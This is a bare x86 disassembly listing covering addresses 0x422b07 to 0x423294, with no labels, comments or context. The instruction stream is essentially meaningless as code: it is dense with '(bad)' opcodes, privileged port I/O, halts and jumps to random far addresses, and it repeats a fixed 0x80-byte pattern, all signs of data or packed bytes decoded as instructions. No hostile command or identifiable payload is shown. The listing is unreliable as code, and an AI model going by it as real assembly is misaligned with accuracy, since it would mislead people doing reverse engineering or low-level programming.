  422b07:	jle    0x422ac8
  422b09:	out    dx,eax
  422b0a:	sbb    edi,esp
  422b0c:	mov    BYTE PTR [ecx+eax*2-0x525987fd],dh
  422b13:	rol    DWORD PTR [ecx],1
  422b15:	add    BYTE PTR [edx+0x0],ah
  422b18:	add    BYTE PTR [eax],al
  422b1a:	sti    
  422b1b:	cli    
  422b1c:	rcr    DWORD PTR [eax-0x45e7627d],1
  422b22:	xor    dh,ah
  422b24:	cmp    ebx,DWORD PTR [eax]
  422b26:	es ret 0xa95e
  422b2a:	push   edi
  422b2b:	add    al,0x6a
  422b2d:	and    al,0x70
  422b2f:	mov    ah,0x84
  422b31:	mov    ebp,ebx
  422b33:	test   DWORD PTR ds:0x8ab30eda,edi
  422b39:	(bad)  [edi+0x416554b0]
  422b3f:	jmp    DWORD PTR [ecx+0x615e78c2]
  422b45:	mov    WORD PTR [esi+esi*1],gs
  422b48:	adc    cl,BYTE PTR [ecx+0x10]
  422b4b:	and    al,0x2d
  422b4d:	sub    eax,0x8d344a83
  422b52:	jp     0x422bab
  422b54:	imul   eax,ecx,0xa
  422b57:	cwde   
  422b58:	mov    al,0xd8
  422b5a:	bound  ebx,QWORD PTR [ebp+0x2568c0f5]
  422b60:	aad    0x9d
  422b62:	xchg   ecx,eax
  422b63:	jne    0x422b7b
  422b65:	xor    al,0x6e
  422b67:	fnstenv [esi]
  422b69:	add    edx,DWORD PTR cs:[edi]
  422b6c:	xchg   edi,eax
  422b6d:	mov    esi,0x8b12d0be
  422b72:	cdq    
  422b73:	pop    ecx
  422b74:	xor    BYTE PTR [edx+0x207a5f54],ch
  422b7a:	and    ah,ah
  422b7c:	add    BYTE PTR [eax],al
  422b7e:	add    BYTE PTR [eax],al
  422b80:	add    BYTE PTR [eax],al
  422b82:	jo     0x422ba7
  422b84:	and    eax,0x7c6f7769
  422b89:	cmp    esp,DWORD PTR [eax-0x5a4311e4]
  422b8f:	pop    ecx
  422b90:	in     al,0x13
  422b92:	psrld  mm0,QWORD PTR [ecx]
  422b95:	add    BYTE PTR [edx+0x0],ah
  422b98:	add    BYTE PTR [eax],al
  422b9a:	in     eax,dx
  422b9b:	out    0xb3,al
  422b9d:	repnz test DWORD PTR [ebx+0x4bbe400a],0x859eb910
  422ba8:	mov    bl,0x65
  422baa:	push   cs
  422bab:	lods   al,BYTE PTR ds:[esi]
  422bac:	fiadd  DWORD PTR [ecx]
  422bae:	es cmp eax,0xe3c29c02
  422bb4:	add    edx,DWORD PTR [ebp-0x19]
  422bb7:	jnp    0x422b90
  422bb9:	mov    edi,0xef91500c
  422bbe:	and    ebx,DWORD PTR [eax+0x735df5e2]
  422bc4:	stos   BYTE PTR es:[edi],al
  422bc5:	inc    edi
  422bc6:	cmp    DWORD PTR [ecx-0x3ec06e5],edx
  422bcc:	daa    
  422bcd:	xchg   ebp,eax
  422bce:	pop    ecx
  422bcf:	shl    DWORD PTR [esi+0xf],0x1a
  422bd3:	iret   
  422bd4:	add    BYTE PTR [ebp-0x5e5e8d9],bh
  422bda:	mov    bl,0x99
  422bdc:	push   ds
  422bdd:	push   ebx
  422bde:	jmp    0x70e22652
  422be3:	xor    al,bh
  422be5:	xor    BYTE PTR [ebp+0x14cc137],cl
  422beb:	push   0xac7a5c34
  422bf0:	push   ecx
  422bf1:	push   cs
  422bf2:	(bad)  
  422bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bf5:	imul   edx,edx,0x6baa00f3
  422bfb:	call   0x422c00
  422c00:	add    BYTE PTR [eax],al
  422c02:	xchg   esp,eax
  422c03:	nop
  422c04:	ffree  st(0)
  422c06:	(bad)  
  422c08:	popf   
  422c09:	aam    0x57
  422c0b:	(bad)
  422c0f:	(bad)  
  422c10:	daa    
  422c11:	fdiv   DWORD PTR [ecx-0x2e]
  422c14:	add    DWORD PTR [eax],eax
  422c16:	bound  eax,QWORD PTR [eax]
  422c18:	add    BYTE PTR [eax],al
  422c1a:	ret    
  422c1b:	aad    0xd7
  422c1d:	shl    BYTE PTR [eax-0x3a],cl
  422c20:	dec    ebx
  422c21:	jmp    0x57a0b023
  422c26:	pop    esi
  422c27:	imul   ebp,DWORD PTR [edx+ebp*2-0x2968e39d],0xbfb2edb4
  422c32:	fidiv  DWORD PTR [edi]
  422c34:	shr    DWORD PTR es:[ecx+ecx*2],1
  422c38:	cmp    eax,0xb1caeb9f
  422c3d:	or     esi,DWORD PTR [ecx+eax*8-0x4a5b32b6]
  422c44:	inc    BYTE PTR [esi]
  422c46:	out    dx,al
  422c47:	(bad)  
  422c48:	fild   DWORD PTR [ecx-0x21c8c550]
  422c4e:	dec    ebx
  422c4f:	int    0xef
  422c51:	push   ecx
  422c52:	cpuid  
  422c54:	jp     0x422bfa
  422c56:	int3   
  422c57:	adc    eax,0x2e3b2889
  422c5c:	les    ecx,FWORD PTR [edx]
  422c5e:	sbb    ah,BYTE PTR [esi+0x69]
  422c61:	iret   
  422c62:	jae    0x422c63
  422c64:	inc    esp
  422c65:	mov    bh,ah
  422c67:	xchg   esp,eax
  422c68:	inc    ebp
  422c69:	inc    edx
  422c6a:	fisttp WORD PTR [edx+edi*1-0x2c14452f]
  422c71:	cmp    BYTE PTR [esi+ecx*1-0x6ce2ab46],0xdc
  422c79:	std    
  422c7a:	push   eax
  422c7b:	jb     0x422c7d
  422c7d:	add    BYTE PTR [eax],al
  422c7f:	add    BYTE PTR [eax],al
  422c81:	add    ah,dh
  422c83:	mov    dl,0x32
  422c85:	(bad)  
  422c86:	jbe    0x422c5e
  422c88:	hlt    
  422c89:	mov    dl,0xb1
  422c8b:	and    al,0xfe
  422c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c8e:	outs   dx,DWORD PTR ds:[esi]
  422c8f:	sub    eax,DWORD PTR [esi+0x7a]
  422c92:	rcl    edx,cl
  422c94:	add    DWORD PTR [eax],eax
  422c96:	bound  eax,QWORD PTR [eax]
  422c98:	add    BYTE PTR [eax],al
  422c9a:	and    edi,edi
  422c9c:	inc    ecx
  422c9d:	mov    cl,0x69
  422c9f:	xchg   ebp,eax
  422ca0:	and    eax,0xc8e52dd1
  422ca5:	adc    dl,BYTE PTR [edi+ecx*8]
  422ca8:	push   es
  422ca9:	pop    ebp
  422caa:	fstp   TBYTE PTR [eax+0x44]
  422cad:	mov    WORD PTR [ebp+0x33],es
  422cb0:	and    al,0xd9
  422cb2:	pop    ss
  422cb3:	push   0x34d916d6
  422cb8:	mov    ebx,0xafa34d
  422cbd:	lods   eax,DWORD PTR fs:[esi]
  422cbf:	cmp    eax,0xc4c2cdd
  422cc4:	(bad)  
  422cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cc6:	push   edx
  422cc7:	mov    ds:0x29ea3722,eax
  422ccc:	rcl    DWORD PTR [ebx-0x2e],cl
  422ccf:	pushf  
  422cd0:	mov    ds:0x3a72bf7b,eax
  422cd5:	xchg   ebx,eax
  422cd6:	mov    ebp,0x64b04806
  422cdb:	push   ds
  422cdc:	dec    esi
  422cdd:	inc    ebp
  422cde:	push   ss
  422cdf:	cmp    DWORD PTR [esi-0x3a35b219],esp
  422ce5:	inc    eax
  422ce6:	stos   DWORD PTR es:[edi],eax
  422ce7:	cwde   
  422ce8:	pop    esp
  422ce9:	sub    eax,0xeb5edbef
  422cee:	adc    al,BYTE PTR [eax+0x2e27d6c9]
  422cf4:	int3   
  422cf5:	inc    edx
  422cf6:	call   0xd0:0x4b4df775
  422cfd:	add    BYTE PTR [eax],al
  422cff:	add    BYTE PTR [eax],al
  422d01:	add    BYTE PTR [edx],dh
  422d03:	ror    esi,cl
  422d05:	mov    ds:0xd37ebfef,al
  422d0a:	sub    edi,DWORD PTR [esi]
  422d0c:	out    0x3f,eax
  422d0e:	(bad)  
  422d10:	rcl    DWORD PTR [esi],1
  422d12:	xor    eax,0x620001d3
  422d17:	add    BYTE PTR [eax],al
  422d19:	add    BYTE PTR ds:0x6de9dc89,cl
  422d1f:	cmp    BYTE PTR [ebx+0x3f],ch
  422d22:	outs   dx,DWORD PTR ds:[esi]
  422d23:	mov    ebx,0xa44c68fe
  422d28:	or     BYTE PTR [ecx+0x4b9fc299],dh
  422d2e:	je     0x422d65
  422d30:	pop    ecx
  422d31:	mov    bl,0x2a
  422d33:	xchg   esp,eax
  422d34:	out    dx,eax
  422d35:	(bad)  
  422d36:	jl     0x422da1
  422d38:	dec    edi
  422d39:	jns    0x422ce3
  422d3b:	ss stos BYTE PTR es:[edi],al
  422d3d:	mov    al,0x1a
  422d3f:	xchg   esi,eax
  422d40:	mov    cl,0xeb
  422d42:	mov    esi,0x99c6e5b0
  422d47:	loopne 0x422d82
  422d49:	(bad)  
  422d4a:	cmc    
  422d4b:	jbe    0x422d87
  422d4d:	inc    edx
  422d4e:	je     0x422dcd
  422d50:	inc    ebx
  422d51:	mov    ds:0x6a57b226,eax
  422d56:	lds    ecx,FWORD PTR [esi+eax*8+0x7]
  422d5a:	mov    DWORD PTR [ebp+esi*1+0x858725b],ecx
  422d61:	sub    BYTE PTR ds:0x53b0a0f3,0x22
  422d68:	lea    ecx,[ecx]
  422d6a:	fcomp  QWORD PTR ds:0x8145b88f
  422d70:	and    DWORD PTR [esi+0x2e],ebx
  422d73:	xlat   BYTE PTR ds:[ebx]
  422d74:	mov    edx,0x5d01fe63
  422d79:	int    0xcb
  422d7b:	push   eax
  422d7c:	add    BYTE PTR [eax],al
  422d7e:	add    BYTE PTR [eax],al
  422d80:	add    BYTE PTR [eax],al
  422d82:	fucomi st,st(5)
  422d84:	outs   dx,BYTE PTR ds:[esi]
  422d85:	and    bh,BYTE PTR [esi-0x5d]
  422d88:	(bad)  
  422d8a:	pop    esi
  422d8b:	(bad)  
  422d8c:	mov    DWORD PTR [ebp-0x6ef01e6f],ecx
  422d92:	xchg   edi,eax
  422d93:	rol    DWORD PTR [ecx],cl
  422d95:	add    BYTE PTR [edx+0x0],ah
  422d98:	add    BYTE PTR [eax],al
  422d9a:	lds    esi,FWORD PTR [eax-0x66]
  422d9d:	aam    0x8e
  422d9f:	sahf   
  422da0:	stos   DWORD PTR es:[edi],eax
  422da1:	(bad)  
  422da2:	mov    esi,0xa9561ca8
  422da7:	mov    ebp,0x97175bcb
  422dac:	mov    bh,0x84
  422dae:	arpl   WORD PTR [esp+ebx*1+0xb],bx
  422db2:	sar    BYTE PTR [esi+0x349e306b],cl
  422db8:	and    esp,DWORD PTR [esi]
  422dba:	cmp    eax,0xef40ecac
  422dbf:	adc    DWORD PTR [esi-0x68bd6b91],ebx
  422dc5:	ss jle 0xefb52382
  422dcc:	pushf  
  422dcd:	fimul  DWORD PTR [edx]
  422dcf:	jl     0x422d69
  422dd1:	int    0x17
  422dd3:	sahf   
  422dd4:	aad    0xbf
  422dd6:	push   esp
  422dd7:	pop    esi
  422dd8:	jmp    0x422deb
  422dda:	outs   dx,BYTE PTR ds:[esi]
  422ddb:	xchg   edx,ebp
  422ddd:	into   
  422dde:	jb     0x422df3
  422de0:	xlat   BYTE PTR ss:[ebx]
  422de2:	or     BYTE PTR [edi],ch
  422de4:	data16 (bad) 
  422de6:	stc    
  422de7:	cmp    BYTE PTR [ecx-0x61],bl
  422dea:	mov    ah,0x74
  422dec:	xchg   esi,eax
  422ded:	mov    edx,0xe7e045bf
  422df2:	dec    ebp
  422df3:	mov    al,0x92
  422df5:	and    al,0x79
  422df8:	arpl   sp,bp
  422dfa:	rcl    DWORD PTR [ebx],cl
  422dfc:	add    BYTE PTR [eax],al
  422dfe:	add    BYTE PTR [eax],al
  422e00:	add    BYTE PTR [eax],al
  422e02:	add    eax,0x6f976b22
  422e07:	(bad)  
  422e09:	mov    dl,0x66
  422e0b:	and    BYTE PTR [esi+0x1cc7cc6a],ah
  422e11:	fdiv   st(1),st
  422e13:	rol    DWORD PTR [ecx],cl
  422e15:	add    BYTE PTR [edx+0x0],ah
  422e18:	add    BYTE PTR [eax],al
  422e1a:	adc    bl,BYTE PTR [ecx+eax*4+0x15]
  422e1e:	jae    0x422e9a
  422e20:	sub    dh,bh
  422e22:	sub    al,0xb3
  422e24:	adc    BYTE PTR [ebx+0x7319e244],0x8a
  422e2b:	retf   
  422e2c:	inc    eax
  422e2d:	push   ecx
  422e2e:	cmc    
  422e2f:	jp     0x422ded
  422e31:	jmp    0x422de5
  422e33:	ret    
  422e34:	push   eax
  422e35:	add    al,dl
  422e37:	jbe    0x422eb8
  422e39:	dec    esp
  422e3a:	jne    0x422eb8
  422e3c:	cmp    BYTE PTR [edi+0x287c2d01],ch
  422e42:	and    ah,dh
  422e44:	or     edx,edi
  422e46:	or     ebx,eax
  422e48:	(bad)  
  422e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e4a:	sbb    eax,0x78c4bf65
  422e4f:	xchg   esi,eax
  422e50:	rol    BYTE PTR [ebx+0x4c],1
  422e53:	mov    dh,0x56
  422e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e56:	pop    esi
  422e57:	xchg   edx,eax
  422e58:	inc    ebx
  422e59:	mov    eax,ds:0x1fbb1ccf
  422e5e:	popa   
  422e5f:	popa   
  422e60:	push   ss
  422e61:	and    al,BYTE PTR [esi+0x7b]
  422e64:	das    
  422e65:	dec    eax
  422e66:	xor    al,0x53
  422e68:	ss js  0x422e19
  422e6b:	dec    esi
  422e6c:	push   esp
  422e6d:	cmp    BYTE PTR [edi-0xa363b55],dh
  422e73:	mov    DWORD PTR [ebp+ecx*8-0x19],esp
  422e77:	fldenv [eax]
  422e79:	mov    dh,0x66
  422e7b:	xchg   BYTE PTR [eax],al
  422e7d:	add    BYTE PTR [eax],al
  422e7f:	add    BYTE PTR [eax],al
  422e81:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422e87:	stc    
  422e88:	call   esi
  422e8a:	into   
  422e8b:	inc    ebp
  422e8c:	mov    bh,0x11
  422e8e:	hlt    
  422e8f:	xchg   ebx,eax
  422e90:	inc    ecx
  422e91:	or     DWORD PTR [ebx-0x2c],ebx
  422e94:	add    DWORD PTR [eax],eax
  422e96:	bound  eax,QWORD PTR [eax]
  422e98:	add    BYTE PTR [eax],al
  422e9a:	sbb    al,BYTE PTR [edi-0x12f10fb0]
  422ea0:	xor    al,0x6b
  422ea2:	lock (bad) 
  422ea4:	or     eax,DWORD PTR [esi]
  422ea6:	mov    WORD PTR [edx-0x70bb4309],cs
  422eac:	xchg   edx,eax
  422ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422eae:	aaa    
  422eaf:	rcr    BYTE PTR [ebp+ecx*2+0x47],1
  422eb3:	add    BYTE PTR [eax],bh
  422eb5:	lock jl 0x422e47
  422eb8:	pop    esp
  422eb9:	push   esp
  422eba:	ror    BYTE PTR [ebx],0x7d
  422ebd:	and    ebx,DWORD PTR [edi-0x4ec6022d]
  422ec3:	es in  eax,0x68
  422ec6:	or     DWORD PTR [ebp+0x7bd0f157],eax
  422ecc:	in     al,0x27
  422ece:	pop    ds
  422ecf:	mov    dh,0xc8
  422ed1:	jo     0x422f52
  422ed3:	out    dx,al
  422ed4:	sub    esi,ebp
  422ed6:	jbe    0x422f16
  422ed8:	inc    esp
  422ed9:	pop    ds
  422eda:	mov    al,ds:0x30af043a
  422edf:	xchg   DWORD PTR [ebp-0x26b4baa2],edx
  422ee5:	mov    ds:0x20875607,al
  422eea:	add    cl,BYTE PTR [edx+ebx*2+0x46]
  422eee:	jg     0x422ed0
  422ef0:	es sub esi,ebp
  422ef3:	(bad)  
  422ef4:	mov    ebx,0xa07b4ac1
  422ef9:	(bad)  
  422efa:	sub    eax,DWORD PTR [ecx]
  422efc:	add    BYTE PTR [eax],al
  422efe:	add    BYTE PTR [eax],al
  422f00:	add    BYTE PTR [eax],al
  422f02:	fisubr WORD PTR [ecx]
  422f04:	cwde   
  422f05:	sar    bh,cl
  422f07:	repz fisubr WORD PTR ds:0x4af35f6
  422f0e:	(bad)  
  422f10:	(bad)  
  422f11:	mov    BYTE PTR [ebp+0x620001d4],bh
  422f17:	add    BYTE PTR [eax],al
  422f19:	add    BYTE PTR [ebp+0x18c9ba90],bh
  422f1f:	pop    ebp
  422f20:	push   edx
  422f21:	sbb    ch,BYTE PTR [ebp+0x1842a2ad]
  422f27:	adc    bl,BYTE PTR [esi+0x1f4d1777]
  422f2d:	cmc    
  422f2e:	ret    
  422f2f:	push   ebx
  422f30:	sti    
  422f31:	jo     0x422fa5
  422f33:	inc    eax
  422f34:	push   esp
  422f35:	sub    al,0xf7
  422f37:	push   0xffffffee
  422f39:	nop
  422f3a:	in     al,dx
  422f3b:	pop    ecx
  422f3c:	std    
  422f3d:	mov    bl,0x5a
  422f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f40:	jns    0x422ed4
  422f42:	stc    
  422f43:	xor    ebx,DWORD PTR [esi+0x5d]
  422f46:	sbb    esi,DWORD PTR [edx+0x7bee354b]
  422f4c:	cmc    
  422f4d:	(bad)  
  422f4e:	je     0x422f4b
  422f50:	leave  
  422f51:	cmp    eax,DWORD PTR [edx]
  422f53:	sub    DWORD PTR [edx+0x4c],0x8ec752fb
  422f5a:	dec    esi
  422f5b:	add    ecx,DWORD PTR [esi-0x15]
  422f5e:	rol    dh,cl
  422f60:	js     0x422f5b
  422f62:	sub    BYTE PTR [ecx+0x29],dh
  422f65:	aas    
  422f66:	ja     0x422fc9
  422f68:	xlat   BYTE PTR ds:[ebx]
  422f69:	adc    ah,BYTE PTR [edx+0x688955a3]
  422f6f:	xchg   edi,eax
  422f70:	shl    bh,cl
  422f72:	data16 fld DWORD PTR [esi]
  422f75:	or     WORD PTR [ebx],bp
  422f78:	sbb    BYTE PTR [edx+0xd05b],bh
  422f7e:	add    BYTE PTR [eax],al
  422f80:	add    BYTE PTR [eax],al
  422f82:	dec    esi
  422f83:	aas    
  422f84:	int3   
  422f85:	sbb    eax,0x7fdffffd
  422f8a:	out    dx,eax
  422f8b:	loopne 0x422fa3
  422f8d:	lods   al,BYTE PTR ds:[esi]
  422f8e:	xor    BYTE PTR [eax-0x2ae0b3eb],dh
  422f94:	add    DWORD PTR [eax],eax
  422f96:	bound  eax,QWORD PTR [eax]
  422f98:	add    BYTE PTR [eax],al
  422f9a:	pusha  
  422f9b:	fwait
  422f9c:	cs xor al,0x3a
  422f9f:	cli    
  422fa0:	push   0x5e1a2c33
  422fa5:	outs   dx,BYTE PTR ds:[esi]
  422fa6:	sar    BYTE PTR [edx],1
  422fa8:	pop    esp
  422fa9:	arpl   WORD PTR [ebp-0x55],ax
  422fac:	popf   
  422fad:	aam    0x90
  422faf:	lods   al,BYTE PTR ds:[esi]
  422fb0:	mov    ebp,0x841e6a86
  422fb5:	ja     0x423003
  422fb7:	popf   
  422fb8:	lods   eax,DWORD PTR ds:[esi]
  422fb9:	imul   DWORD PTR [esi-0x63]
  422fbc:	push   ds
  422fbd:	sbb    esi,DWORD PTR [esp+edi*1+0x16ab4e23]
  422fc4:	jecxz  0x422fb3
  422fc6:	push   ds
  422fc7:	outs   dx,BYTE PTR ds:[esi]
  422fc8:	sub    eax,0x898859c7
  422fcd:	(bad)  
  422fce:	lock xor al,0xea
  422fd1:	pop    ds
  422fd2:	retf   0x373f
  422fd5:	pop    edi
  422fd6:	xor    al,BYTE PTR [ecx-0x473fed1d]
  422fdc:	adc    DWORD PTR [edi+0x7f],ecx
  422fdf:	call   0x7ab70a0f
  422fe4:	and    BYTE PTR [ebp-0x2de3cd7a],0x2b
  422feb:	xchg   esi,eax
  422fec:	sbb    dh,BYTE PTR [eax+0x3717eba5]
  422ff2:	xchg   ebp,eax
  422ff3:	lods   al,BYTE PTR ds:[esi]
  422ff4:	aaa    
  422ff5:	lock xchg DWORD PTR [edx-0xb198f1d],ecx
  422ffc:	add    BYTE PTR [eax],al
  422ffe:	add    BYTE PTR [eax],al
  423000:	add    BYTE PTR [eax],al
  423002:	push   ds
  423003:	test   eax,0x7ff735f6
  423008:	fild   QWORD PTR [ebx-0x5f9ed871]
  42300e:	pop    es
  42300f:	sub    ah,BYTE PTR [esi+ecx*8]
  423012:	adc    ebp,0x620001
  423018:	add    BYTE PTR [eax],al
  42301a:	and    BYTE PTR [edx+ecx*1+0x15de4267],dh
  423021:	jne    0x422fbc
  423023:	push   0xe829f545
  423028:	nop
  423029:	fstp   DWORD PTR [eax]
  42302b:	xchg   ebp,eax
  42302c:	(bad)  
  42302d:	loopne 0x422fb6
  42302f:	xchg   ecx,eax
  423030:	jp     0x422fe1
  423032:	pop    es
  423033:	mov    eax,ds:0x14a1aaa6
  423038:	mov    edx,0xda78b6dc
  42303d:	int3   
  42303e:	add    esi,DWORD PTR [ecx]
  423040:	ss fwait
  423042:	lock js 0x42305b
  423045:	out    0x1b,eax
  423047:	(bad)  
  423048:	hlt    
  423049:	loop   0x42309c
  42304b:	retf   
  42304c:	push   ecx
  42304d:	loope  0x423082
  42304f:	or     BYTE PTR [eax],0x68
  423052:	add    DWORD PTR [ebx-0xb],esp
  423055:	iret   
  423056:	inc    edi
  423057:	jmp    0xfd34ce74
  42305c:	fdivr  DWORD PTR [esi+0x3be4544e]
  423062:	pop    eax
  423063:	js     0x423093
  423065:	sub    esi,DWORD PTR [ebp+0x2269bcd5]
  42306b:	xchg   edi,eax
  42306c:	dec    ebp
  42306d:	jg     0x42302c
  42306f:	leave  
  423070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423071:	sbb    eax,0xbba8fb48
  423076:	xchg   BYTE PTR [edi-0x57],ch
  423079:	(bad)  [esi]
  42307b:	int3   
  42307c:	add    BYTE PTR [eax],al
  42307e:	add    BYTE PTR [eax],al
  423080:	add    BYTE PTR [eax],al
  423082:	fwait
  423083:	loope  0x4230f2
  423085:	sub    eax,0xf7dbad7f
  42308a:	sar    BYTE PTR [ebx],cl
  42308c:	(bad)  
  42308d:	add    BYTE PTR [eax+0x65],al
  423090:	jns    0x4230b6
  423092:	jecxz  0x423069
  423094:	add    DWORD PTR [eax],eax
  423096:	bound  eax,QWORD PTR [eax]
  423098:	add    BYTE PTR [eax],al
  42309a:	mov    WORD PTR [ebx-0x12002fea],gs
  4230a0:	pop    edi
  4230a1:	dec    ebx
  4230a2:	sub    esi,edx
  4230a4:	int3   
  4230a5:	ror    ecx,cl
  4230a7:	ret    0xd7a4
  4230aa:	arpl   WORD PTR [edx+0x71],sp
  4230ad:	pop    eax
  4230ae:	add    al,0x3f
  4230b0:	out    dx,al
  4230b1:	dec    esi
  4230b2:	push   esp
  4230b3:	shr    DWORD PTR [eax],cl
  4230b5:	mov    bh,0x7c
  4230b7:	retf   0x6652
  4230ba:	xchg   ecx,eax
  4230bb:	and    esp,eax
  4230bd:	ror    DWORD PTR [eax+0x7a397860],1
  4230c3:	mov    dh,0x83
  4230c5:	mov    BYTE PTR [edx-0x2890e95f],bl
  4230cb:	jle    0x42307e
  4230cd:	ficom  DWORD PTR [esi+0x14]
  4230d0:	add    DWORD PTR [ecx],esi
  4230d2:	lahf   
  4230d3:	inc    esp
  4230d4:	inc    ecx
  4230d5:	xor    bl,bl
  4230d7:	sub    BYTE PTR [edi+0x10],0x6
  4230db:	inc    ecx
  4230dc:	lahf   
  4230dd:	jge    0x4230e9
  4230df:	nop
  4230e0:	cli    
  4230e1:	stc    
  4230e2:	loope  0x4230ab
  4230e4:	call   0x391e293e
  4230e9:	shl    dh,cl
  4230eb:	cld    
  4230ec:	xor    cl,BYTE PTR [eax-0x5b]
  4230ef:	xor    eax,0x3de823ec
  4230f4:	or     BYTE PTR [eax],ch
  4230f6:	daa    
  4230f7:	jecxz  0x4230ec
  4230f9:	fdivr  st(0),st
  4230fb:	add    BYTE PTR ds:[eax],al
  4230fe:	add    BYTE PTR [eax],al
  423100:	add    BYTE PTR [eax],al
  423102:	or     bh,dh
  423104:	ja     0x423150
  423106:	dec    edx
  423108:	cmp    eax,0x2e8eedf7
  42310d:	dec    eax
  42310e:	pop    ebx
  42310f:	stc    
  423110:	fisttp DWORD PTR [ecx]
  423112:	inc    ebp
  423113:	(bad)  
  423114:	add    DWORD PTR [eax],eax
  423116:	bound  eax,QWORD PTR [eax]
  423118:	add    BYTE PTR [eax],al
  42311a:	addr16 mov al,ds:0x1a76
  42311e:	inc    ecx
  42311f:	cwde   
  423120:	jns    0x42319f
  423122:	mov    BYTE PTR [ecx+edx*1-0x10],ah
  423126:	lds    esp,FWORD PTR [ebx+0x6b]
  423129:	push   ss
  42312a:	shl    DWORD PTR [edx-0x690fd94e],0x27
  423131:	in     al,dx
  423132:	mov    edi,0x4c6ec965
  423137:	lea    esi,[ecx]
  423139:	push   0xffffff91
  42313b:	es enter 0xbdf7,0x2f
  423140:	cmp    cl,BYTE PTR ds:0x74942706
  423146:	xor    al,0xa1
  423148:	in     al,0x98
  42314a:	push   ecx
  42314b:	and    ah,bl
  42314d:	gs jecxz 0x42315c
  423150:	aaa    
  423151:	retf   
  423152:	addr16 into 
  423154:	sub    dl,BYTE PTR [edx+ebx*8+0x3b0a9451]
  42315b:	mov    ds:0x7c72c3e6,eax
  423160:	aas    
  423161:	sbb    bh,bh
  423163:	lahf   
  423164:	mov    ecx,0x5c12cabc
  423169:	pop    esp
  42316a:	sbb    edi,DWORD PTR [edi+0x1a909d90]
  423170:	pop    ds
  423171:	adc    al,0xc2
  423173:	or     al,0xa1
  423175:	call   0x7dafba16
  42317a:	in     eax,dx
  42317b:	add    DWORD PTR [eax],0x0
  423181:	add    BYTE PTR [esi],dh
  423183:	arpl   WORD PTR [eax-0x10],bp
  423186:	jge    0x423183
  423188:	mov    esi,0x8c7853e7
  42318d:	daa    
  42318e:	or     ch,al
  423190:	and    al,0x2f
  423192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423193:	(bad)  
  423194:	add    DWORD PTR [eax],eax
  423196:	bound  eax,QWORD PTR [eax]
  423198:	add    BYTE PTR [eax],al
  42319a:	and    eax,0xea759e0f
  42319f:	in     al,0x6b
  4231a1:	out    0x27,eax
  4231a3:	dec    esp
  4231a4:	lods   al,BYTE PTR ds:[esi]
  4231a5:	or     DWORD PTR [ebx+0x35551400],esp
  4231ab:	xchg   esi,eax
  4231ac:	lock das 
  4231ae:	add    al,0xb2
  4231b0:	xchg   ebp,eax
  4231b1:	push   ds
  4231b2:	int    0x5f
  4231b4:	mov    al,dh
  4231b6:	sub    ebp,DWORD PTR [eax]
  4231b8:	sti    
  4231b9:	jg     0x423154
  4231bb:	pop    edx
  4231bc:	xchg   DWORD PTR [eax],ebx
  4231be:	fwait
  4231bf:	icebp  
  4231c0:	or     BYTE PTR [esi+0x6c273511],dl
  4231c6:	mov    DWORD PTR [ebx+ebp*1+0x22f9f7b6],ebx
  4231cd:	or     eax,0x3e138bbf
  4231d2:	and    edi,DWORD PTR [ebp-0x69a83521]
  4231d8:	dec    ebx
  4231d9:	xor    edi,esi
  4231db:	fstp   QWORD PTR [eax-0x31fcde77]
  4231e1:	sub    eax,0xcf2c5485
  4231e6:	adc    ch,BYTE PTR [ebx+esi*4+0x47ea6fea]
  4231ed:	sbb    DWORD PTR [edx],eax
  4231ef:	popf   
  4231f0:	loopne 0x4231d7
  4231f2:	cdq    
  4231f3:	jo     0x42323f
  4231f5:	mov    esp,0xb997f4eb
  4231fa:	dec    edx
  4231fb:	jle    0x4231fd
  4231fd:	add    BYTE PTR [eax],al
  4231ff:	add    BYTE PTR [eax],al
  423201:	add    BYTE PTR [edi],ah
  423203:	ss lahf 
  423205:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42320b:	and    eax,0x6e11075b
  423210:	outs   dx,BYTE PTR ds:[esi]
  423211:	mov    al,ds:0x1de4f
  423216:	bound  eax,QWORD PTR [eax]
  423218:	add    BYTE PTR [eax],al
  42321a:	jecxz  0x423231
  42321c:	sub    ch,BYTE PTR [ecx+eiz*2-0x5b3c6e57]
  423223:	test   al,0x49
  423225:	scas   al,BYTE PTR es:[edi]
  423226:	jbe    0x423289
  423228:	adc    DWORD PTR [eax+edx*2],edi
  42322b:	push   0x5153fd14
  423230:	xchg   DWORD PTR [esi],edx
  423232:	xchg   ebp,eax
  423233:	push   ebp
  423234:	out    0x86,al
  423236:	push   esi
  423237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423238:	jae    0x42320c
  42323a:	retf   
  42323b:	loope  0x423212
  42323d:	jge    0x42327f
  42323f:	inc    BYTE PTR [esi]
  423241:	mov    dl,0x8
  423243:	add    al,0x41
  423245:	xor    DWORD PTR [ecx],edx
  423247:	cmp    eax,0x6fb777f0
  42324c:	jecxz  0x423271
  42324e:	das    
  42324f:	and    al,0x93
  423251:	mov    al,ds:0x56dbd26f
  423256:	into   
  423257:	and    esp,DWORD PTR [esi+0x7c]
  42325a:	lahf   
  42325b:	pop    edx
  42325c:	sbb    ch,dl
  42325e:	sbb    ebx,ebx
  423260:	sbb    eax,0xf78a0861
  423265:	retf   0xb734
  423268:	push   ebp
  423269:	or     edi,0x6f
  42326c:	aaa    
  42326d:	mov    ecx,0x9481c952
  423272:	jb     0x423212
  423274:	out    0xf0,eax
  423276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423277:	out    dx,eax
  423278:	and    ebp,DWORD PTR [ebx]
  42327a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42327b:	mov    ds:0x0,al
  423280:	add    BYTE PTR [eax],al
  423282:	aaa    
  423283:	(bad)  
  423284:	out    0xc2,eax
  423286:	mul    ebx
  423288:	aaa    
  423289:	cmc    
  42328a:	xchg   ecx,eax
  42328b:	call   0xf6b:0xd651eef4
  423292:	mov    cl,0xde
  423294:	add    DWORD PTR [eax],eax
